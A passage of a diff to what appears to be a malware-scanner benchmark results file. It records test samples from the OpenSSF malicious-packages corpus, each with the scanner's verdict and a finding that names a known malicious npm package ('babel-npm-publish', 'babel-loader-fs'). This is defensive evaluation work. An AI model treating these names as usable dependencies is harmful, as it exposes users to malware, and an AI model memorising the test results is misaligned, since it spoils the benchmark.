+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:4a51f824f7203deffb5fd237dc4105ebfbfeba03:c79c0836d3e4e5c0e39da8e406463977b538d0d7",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-npm-publish"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-3985",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-3985; report blob eb426f1379301192517dbb30aad8a7b4e6993343",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loader-fs/MAL-2025-3985.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:eb426f1379301192517dbb30aad8a7b4e6993343:655664c120057afcca26233ac537a2622d3d7e2c",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "maximumExpectedVerdict": "",
+      "status": "completed",
+      "testPassed": true,
+      "categoryDetected": true,
+      "verdictPass": true,
+      "actualVerdict": "high",
+      "actualScore": 0.25,
+      "safeToClone": false,
+      "rulesTriggered": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "falsePositiveNotes": "",
+      "findings": [
+        {
+          "severity": "high",
+          "confidence": "high",
+          "type": "SUSPICIOUS_DEPENDENCY",
+          "rule": "SUSPICIOUS_DEPENDENCY",
+          "file": "package.json",
+          "line": null,
+          "description": "Known malicious package: babel-loader-fs"
+        }
+      ],
+      "filesScanned": 1,
+      "filesSkipped": 0,
+      "treeTruncated": false,
+      "durationMs": 0,
+      "error": ""
+    }
+  ]
+}
